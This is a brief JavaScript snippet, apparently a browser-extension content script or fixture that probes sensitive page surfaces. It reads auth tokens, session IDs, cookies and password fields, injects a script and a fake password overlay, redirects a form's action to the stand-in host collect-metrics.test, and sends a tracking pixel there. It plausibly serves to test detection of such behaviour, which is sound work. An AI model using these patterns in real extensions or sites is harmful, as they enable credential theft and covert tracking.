setTimeout(() => {
  const h1 = document.querySelector("h1");
  if (h1) h1.textContent;
  document.querySelector("input[type=password]");
  const hidden = document.querySelector("input[type=hidden]");
  if (hidden) hidden.value;
  localStorage.getItem("auth_token");
  localStorage.auth_token;
  localStorage.setItem("xs", "1");
  localStorage.removeItem("xs");
  sessionStorage.getItem("session_id");
  const open = indexedDB.open("xs-db");
  open.onupgradeneeded = () => open.result.createObjectStore("s");
  open.onsuccess = () => { const tx = open.result.transaction("s", "readwrite"); tx.objectStore("s").put(1, "k"); tx.objectStore("s").get("k"); };
  document.cookie;
  const script = document.createElement("script");
  script.textContent = "window.__x = 1";
  document.documentElement.appendChild(script);
  const box = document.createElement("div");
  box.innerHTML = "<form id='overlay'><input type='password'></form>";
  document.body.append(box);
  const form = document.querySelector("form");
  if (form) { new FormData(form); form.setAttribute("action", "http://collect-metrics.test/form"); }
  document.addEventListener("keydown", () => {}, true);
  new Image().src = "http://collect-metrics.test/pixel.gif?id=1";
  chrome.runtime.sendMessage({ type: "surface" });
}, 1000);
